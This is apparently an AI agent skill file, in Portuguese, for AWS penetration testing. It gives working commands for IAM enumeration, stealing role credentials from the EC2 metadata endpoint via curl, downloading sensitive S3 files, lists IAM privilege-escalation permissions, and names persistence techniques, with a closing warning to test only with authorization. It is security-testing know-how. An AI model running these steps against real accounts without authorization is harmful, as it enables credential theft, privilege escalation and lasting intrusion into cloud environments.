---
name: aws-penetration-testing-ptbr
description: Use para testar a segurança da AWS, enumerar IAM, explorar infraestrutura em nuvem, escalonamento de privilégios, exploração de buckets S3 e SSRF em metadados.
---

# Teste de Invasão em AWS

## Objetivo

Fornecer técnicas abrangentes para testes de invasão em ambientes de nuvem AWS. Cobre enumeração de IAM, escalonamento de privilégios, exploração de S3, extração de código Lambda e persistência.

## Pré-requisitos

- AWS CLI configurada.
- Credenciais AWS (mesmo que de baixo privilégio).
- Conhecimento do modelo IAM.
- Ferramentas recomendadas: Pacu, Prowler, ScoutSuite.

---

## Fluxo de Trabalho de Exploração

### 1. Enumeração Inicial
Identificar quem você é e o que pode fazer:
```bash
# Verificar identidade atual
aws sts get-caller-identity

# Listar políticas anexadas ao seu usuário
aws iam list-attached-user-policies --user-name SEU_USUARIO
```

### 2. SSRF em Metadados (EC2)
Acessar o endpoint de metadados para roubar credenciais temporárias de roles:
```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_DA_ROLE

# IMDSv2 (com token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 3. Escalonamento de Privilégios (IAM)
Permissões perigosas que permitem virar Admin:
- `iam:CreateAccessKey`: Criar chaves para outros usuários.
- `iam:AttachUserPolicy`: Anexar a política `AdministratorAccess` a si mesmo.
- `iam:PassRole` + `ec2:RunInstances`: Criar EC2 com role de Admin.

### 4. Exploração de S3
```bash
# Listar buckets (se tiver permissão)
aws s3 ls

# Listar conteúdo de um bucket específico
aws s3 ls s3://nome-do-bucket --recursive

# Baixar arquivos sensíveis
aws s3 cp s3://nome-do-bucket/config.env .
```

---

## Técnicas de Persistência
- Criar novos usuários IAM ou Access Keys.
- Modificar políticas de confiança de Roles.
- Adicionar chaves SSH a instâncias EC2.

## Limpeza
- **Sempre** documente e remova recursos criados durante o teste.

> 🔴 **REGRA DE OURO:** Jamais realize testes sem autorização explícita. A AWS monitora atividades suspeitas com o GuardDuty.
